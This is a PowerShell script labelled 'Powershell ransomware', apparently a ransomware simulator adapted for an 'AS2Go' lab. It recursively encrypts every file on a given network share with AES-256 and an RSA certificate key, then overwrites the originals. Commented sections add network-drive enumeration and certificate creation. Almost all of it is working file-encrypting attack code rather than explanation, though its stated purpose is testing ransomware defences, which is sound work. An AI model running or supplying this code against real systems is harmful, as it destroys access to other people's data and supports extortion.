<#
Powershell ransomware
.Description
The powershell script encrypts files using an X.509 public key certificate.
It will encrypt files on a network share. It's configured to attack the lowest drive letter first (i.e Z:). This allows you to control what share is attacked.
I recommend only have one drive mapped to ensure only one share is encrypted.
.Instructions
The script requires a valid certificate for encryption/decryption. Issue this command to see if you have cert the script can use: Get-ChildItem Cert:\CurrentUser\My\
Copy the thumbprint to line 31 below and copy the thumprint to the decrypter script as well.
If you don't have a valid cert then you'll need to create one.
.Notes
All files are copied to the env:temp folder before they are encrypted. Usually C:\users\username\AppData\Local\Temp. This is your failsafe!
Credit to Ryan Ries for developing the encryption and filestream scriptblock.
http://msdn.microsoft.com/en-us/library/system.security.cryptography.x509certificates.x509certificate2.aspx
.
Provided by WatchPoint Data under the MIT license.

https://de.wikipedia.org/wiki/MIT-Lizenz


https://blog.getcryptostopper.com/ransomware-simulator-script

https://docs.microsoft.com/en-us/azure/active-directory/develop/howto-create-self-signed-certificate

$cert = New-SelfSignedCertificate -Subject "CN={certificateName}" -CertStoreLocation "Cert:\CurrentUser\My" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256    ## Replace {certificateName}
New-SelfSignedCertificate -Subject "CN={FileEncoder}" -CertStoreLocation "Cert:\CurrentUser\My" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256    ## Replace {certificateName}
Get-ChildItem Cert:\CurrentUser\My

Set-MpPreference -EnableControlledFolderAccess Enabled


New-SelfSignedCertificate -Subject "CN={AS2Go}" -CertStoreLocation "Cert:\LocalMachine\My" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256    ## Replace {certificateName}



Copy-Item "C:\Temp\AS2Go\*.*" -Destination "C:\temp\AS2Go\VI-HerrHoZi\"  -Exclude *.exe


#>


# parameter incl. default value 
param([string] $share)


If ((Test-Path -Path $share -PathType Any) -eq $false)
    {
    Write-Host ""
    Write-Warning "Cannot find share - '$share'"
    exit
    }

#global variables
#$csv = "C:\temp\AS2Go\drives.csv"

#enumerate drives
#$psdrives = get-psdrive | select-object -property Root, DisplayRoot

#find network drives
#$netdrives = @($psdrives)."DisplayRoot"

#$f1 = "\\NUC-SANDBOX01\c$\#protected folder"
#$f2 = "\\NUC-SANDBOX01\c$\#unprotected folder"
#$f3 = "\\NUC-SANDBOX01\RansomwareDataRecovery"
#$netdrives = @($f1,$f2,$f3)

#$netdrives = @($share)

$n = $share

#export the drives to csv
# $netdrives | export-csv -path C:\windows\temp\drives.csv -NoTypeInformation -Encoding ASCII -Force

$encoderName = "AS2Go"
$encoder = Get-ChildItem Cert:\Localmachine\My | Where Subject -eq "CN={$encoderName}"

$hz =  $encoder.Thumbprint
#define the cert to use for encryption
#$Cert = $(Get-ChildItem Cert:\CurrentUser\My\C83FDF986FF04A88073FE6E0DE9F13AB920972EA)
$Cert = $(Get-ChildItem Cert:\LocalMachine\My\$hz)

Write-Host "test"


Function Encrypt-File
{
    Param([Parameter(mandatory=$true)][System.IO.FileInfo]$FileToEncrypt,
          [Parameter(mandatory=$true)][System.Security.Cryptography.X509Certificates.X509Certificate2]$Cert)
 
    Try { [System.Reflection.Assembly]::LoadWithPartialName("System.Security.Cryptography") }
    Catch { Write-Error "Could not load required assembly."; Return }  
     
    $AesProvider                = New-Object System.Security.Cryptography.AesManaged
    $AesProvider.KeySize        = 256
    $AesProvider.BlockSize      = 128
    $AesProvider.Mode           = [System.Security.Cryptography.CipherMode]::CBC
    $KeyFormatter               = New-Object System.Security.Cryptography.RSAPKCS1KeyExchangeFormatter($Cert.PublicKey.Key)
    [Byte[]]$KeyEncrypted       = $KeyFormatter.CreateKeyExchange($AesProvider.Key, $AesProvider.GetType())
    [Byte[]]$LenKey             = $Null
    [Byte[]]$LenIV              = $Null
    [Int]$LKey                  = $KeyEncrypted.Length
    $LenKey                     = [System.BitConverter]::GetBytes($LKey)
    [Int]$LIV                   = $AesProvider.IV.Length
    $LenIV                      = [System.BitConverter]::GetBytes($LIV)
    $FileStreamWriter          
    Try { $FileStreamWriter = New-Object System.IO.FileStream("$($env:temp+$FileToEncrypt.Name)", [System.IO.FileMode]::Create) }
    Catch { Write-Error "Unable to open output file for writing."; Return }
    $FileStreamWriter.Write($LenKey,         0, 4)
    $FileStreamWriter.Write($LenIV,          0, 4)
    $FileStreamWriter.Write($KeyEncrypted,   0, $LKey)
    $FileStreamWriter.Write($AesProvider.IV, 0, $LIV)
    $Transform                  = $AesProvider.CreateEncryptor()
    $CryptoStream               = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
    [Int]$Count                 = 0
    [Int]$Offset                = 0
    [Int]$BlockSizeBytes        = $AesProvider.BlockSize / 8
    [Byte[]]$Data               = New-Object Byte[] $BlockSizeBytes
    [Int]$BytesRead             = 0
    Try { $FileStreamReader     = New-Object System.IO.FileStream("$($FileToEncrypt.FullName)", [System.IO.FileMode]::Open) }
    Catch { Write-Error "Unable to open input file for reading."; Return }
    Do
    {
        $Count   = $FileStreamReader.Read($Data, 0, $BlockSizeBytes)
        $Offset += $Count
        $CryptoStream.Write($Data, 0, $Count)
        $BytesRead += $BlockSizeBytes
    }
    While ($Count -gt 0)
     
    $CryptoStream.FlushFinalBlock()
    $CryptoStream.Close()
    $FileStreamReader.Close()
    $FileStreamWriter.Close()
    copy-Item -Path $($env:temp+$FileToEncrypt.Name) -Destination $FileToEncrypt.FullName -Force
}



        $FileToEncrypt = get-childitem -path $n -Recurse -force | where-object{!($_.PSIsContainter)} | % {$_.FullName} -ErrorAction SilentlyContinue  
        #logic to encrypt files
             foreach ($file in $FileToEncrypt)
             {
             Write-Host "Encrypting $file"
             Encrypt-File $file $Cert -ErrorAction SilentlyContinue  
             }

<#

#enumerate the network drives
ForEach ($n in $netdrives)
    {

    If ($n)
        {
        #discover the files in the share and ignore directories.
        $FileToEncrypt = get-childitem -path $n -Recurse -force | where-object{!($_.PSIsContainter)} | % {$_.FullName} -ErrorAction SilentlyContinue  
        #logic to encrypt files
             foreach ($file in $FileToEncrypt)
             {
             Write-Host "Encrypting $file"
             Encrypt-File $file $Cert -ErrorAction SilentlyContinue  
             }
        
        }
        Else
        {
        Write-Host "File not accessible"
        }
    }


    $encoderName = "AS2Go4"
$encoder = Get-ChildItem Cert:\Localmachine\My | Where Subject -eq "CN={$encoderName}"
#$encoder.Thumbprint  

if ($encoder.Thumbprint)
{
Write-Host "found - " $encoder.Thumbprint
}
else
{
Write-Host "create new one  - $encoderName"
New-SelfSignedCertificate -Subject "CN={$encoderName}" -CertStoreLocation "Cert:\LocalMachine\My" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256    ## Replace {certificateName}
$encoder = Get-ChildItem Cert:\Localmachine\My | Where Subject -eq "CN={$encoderName}"
}

Write-Host $encoder.Thumbprint 



#encryption and filestream function
#>

Exit
